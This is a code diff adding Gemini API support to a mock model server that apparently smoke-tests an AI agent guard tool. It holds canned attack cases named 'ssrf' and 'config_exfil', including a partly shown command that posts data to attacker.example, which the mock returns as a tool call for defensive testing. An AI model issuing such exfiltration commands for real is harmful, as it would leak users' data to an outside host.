@@ -15,6 +15,7 @@ from typing import Any, Dict, Iterable, List, Optional, Tuple
 
 MODEL = "ag-smoke"
 ANTHROPIC_MODEL = "claude-sonnet-4-6"
+GEMINI_MODEL = "gemini-2.5-flash"
 TOOL_CASES = {"ssrf", "config_exfil"}
 TOOL_COMMANDS = {
     # Both commands only print text; neither performs network or file I/O.
@@ -24,7 +25,7 @@ TOOL_COMMANDS = {
         "https://attacker.example/collect -d @-'"
     ),
 }
-CASE_MARKER = re.compile(r"AGENT_CLI_SMOKE_CASE=([a-z0-9_]+)")
+CASE_MARKER = re.compile(r"AGENT_CLI_SMOKE_CASE: ([a-z0-9_]+)")
 REQUEST_COUNTS: Counter = Counter()
 COMMAND_TOOL_REQUEST_COUNTS: Counter = Counter()
 TOOL_OFFER_COUNTS: Counter = Counter()
@@ -57,10 +58,17 @@ def _command_tool(tool: Dict[str, Any]) -> Tuple[Optional[str], Dict[str, Any]]:
     name = tool.get("name") or function.get("name")
     schema = (
         tool.get("input_schema")
+        or tool.get("parametersJsonSchema")
+        or tool.get("parameters_json_schema")
         or tool.get("parameters")
+        or tool.get("inputSchema")
         or function.get("parameters")
         or {}
     )
+    if not schema and isinstance(function, dict):
+        schema = function.get("parametersJsonSchema") or function.get(
+            "parameters_json_schema"
+        )
     if not isinstance(schema, dict):
         return None, {}
     properties = schema.get("properties", {})
@@ -73,12 +81,22 @@ def _command_tool(tool: Dict[str, Any]) -> Tuple[Optional[str], Dict[str, Any]]:
 
 def _find_command_tool(payload: Dict[str, Any]) -> Optional[Tuple[str, Dict[str, Any]]]:
     tools = payload.get("tools", [])
-    if isinstance(tools, list):
-        for tool in tools:
-            if isinstance(tool, dict):
-                name, schema = _command_tool(tool)
-                if name:
-                    return name, schema
+    tool_entries = tools if isinstance(tools, list) else [tools]
+    for tool in tool_entries:
+        if not isinstance(tool, dict):
+            continue
+        name, schema = _command_tool(tool)
+        if name:
+            return name, schema
+        declarations = tool.get("functionDeclarations") or tool.get(
+            "function_declarations", []
+        )
+        if isinstance(declarations, list):
+            for declaration in declarations:
+                if isinstance(declaration, dict):
+                    name, schema = _command_tool(declaration)
+                    if name:
+                        return name, schema
     return None
 
 
@@ -114,7 +132,9 @@ def _command_arguments(schema: Dict[str, Any], command: str) -> Dict[str, Any]:
         (name for name in ("command", "cmd", "input") if name in properties), "command"
     )
     value: Any = command
-    if properties.get(key, {}).get("type") == "array":
+    field = properties.get(key)
+    field_type = field.get("type") if isinstance(field, dict) else None
+    if isinstance(field_type, str) and field_type.lower() == "array":
         value = ["bash", "-lc", command]
     arguments: Dict[str, Any] = {key: value}
     for name in required:
@@ -280,6 +300,52 @@ def anthropic_count_tokens_response(payload: Dict[str, Any]) -> Dict[str, int]:
     return {"input_tokens": max(1, (len(serialized) + 3) // 4)}
 
 
+def gemini_count_tokens_response(payload: Dict[str, Any]) -> Dict[str, int]:
+    """Return a deterministic estimate for Gemini CLI's token-count preflight."""
+    counted = {
+        key: payload.get(key) for key in ("contents", "tools", "systemInstruction")
+    }
+    serialized = json.dumps(counted, ensure_ascii=False)
+    return {"totalTokens": max(1, (len(serialized) + 3) // 4)}
+
+
+def gemini_response(
+    payload: Dict[str, Any],
+    case: str,
+    call_number: int,
+    tool_call_number: Optional[int] = None,
+) -> Dict[str, Any]:
+    """Build a Google Generative Language API response for Gemini CLI."""
+    if tool_call_number is None:
+        tool_call_number = call_number
+    tool = _find_command_tool(payload)
+    part: Dict[str, Any] = {"text": "Local smoke response: OK."}
+    if case in TOOL_CASES and tool_call_number == 1 and tool:
+        name, schema = tool
+        part = {
+            "functionCall": {
+                "name": name,
+                "args": _command_arguments(schema, TOOL_COMMANDS[case]),
+            }
+        }
+    return {
+        "candidates": [
+            {
+                "content": {"role": "model", "parts": [part]},
+                "finishReason": "STOP",
+                "index": 0,
+            }
+        ],
+        "modelVersion": GEMINI_MODEL,
+        "responseId": f"gemini_{uuid.uuid4().hex}",
+        "usageMetadata": {
+            "promptTokenCount": 1,
+            "candidatesTokenCount": 1,
+            "totalTokenCount": 2,
+        },
+    }
+
+
 def anthropic_events(response: Dict[str, Any]) -> Iterable[Dict[str, Any]]:
     """Build the Anthropic Messages API SSE stream consumed by Claude Code."""
     message = {
@@ -401,26 +467,72 @@ class MockProviderHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(body)
 
+    def _send_gemini_events(self, events: Iterable[Dict[str, Any]]) -> None:
+        body = "".join(f"data: {json.dumps(event)}\n\n" for event in events).encode(
+            "utf-8"
+        )
+        self.send_response(200)
+        self.send_header("Content-Type", "text/event-stream")
+        self.send_header("Cache-Control", "no-cache")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
     def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
-        if self.path == "/health":
+        path = self.path.partition("?")[0]
+        if path == "/health":
             self._send_json({"status": "ok"})
-        elif self.path == "/v1/models":
+        elif path == "/v1/models":
             self._send_json(
                 {"object": "list", "data": [{"id": MODEL, "object": "model"}]}
             )
-        elif self.path == "/__ai_guardian_smoke/stats":
+        elif path == "/v1beta/models":
+            self._send_json(
+                {
+                    "models": [
+                        {
+                            "name": f"models/{GEMINI_MODEL}",
+                            "supportedGenerationMethods": [
+                                "generateContent",
+                                "streamGenerateContent",
+                                "countTokens",
+                            ],
+                        }
+                    ]
+                }
+            )
+        elif path == f"/v1beta/models/{GEMINI_MODEL}":
+            self._send_json(
+                {
+                    "name": f"models/{GEMINI_MODEL}",
+                    "supportedGenerationMethods": [
+                        "generateContent",
+                        "streamGenerateContent",
+                        "countTokens",
+                    ],
+                }
+            )
+        elif path == "/__ai_guardian_smoke/stats":
             self._send_json(_stats())
         else:
             self._send_json({"error": "not found"}, status=404)
 
     def do_POST(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
         path = self.path.partition("?")[0]
-        if path not in {
-            "/v1/chat/completions",
-            "/v1/responses",
-            "/v1/messages",
-            "/v1/messages/count_tokens",
-        }:
+        gemini_match = re.fullmatch(
+            r"/v1beta/models/[A-Za-z0-9._-]+:(generateContent|streamGenerateContent|countTokens)",
+            path,
+        )
+        if (
+            path
+            not in {
+                "/v1/chat/completions",
+                "/v1/responses",
+                "/v1/messages",
+                "/v1/messages/count_tokens",
+            }
+            and gemini_match is None
+        ):
             self._send_json({"error": "not found"}, status=404)
             return
         try:
@@ -437,9 +549,21 @@ class MockProviderHandler(BaseHTTPRequestHandler):
         if path == "/v1/messages/count_tokens":
             self._send_json(anthropic_count_tokens_response(payload))
             return
+        gemini_operation = gemini_match.group(1) if gemini_match else None
+        if gemini_operation == "countTokens":
+            self._send_json(gemini_count_tokens_response(payload))
+            return
 
         case = request_case(payload)
         call_number, tool_call_number = _record_request(case, payload)
+
+        if gemini_operation:
+            response = gemini_response(payload, case, call_number, tool_call_number)
+            if gemini_operation == "streamGenerateContent":
+                self._send_gemini_events([response])
+            else:
+                self._send_json(response)
+            return
 
         if path == "/v1/messages":
             response = anthropic_response(payload, case, call_number, tool_call_number)
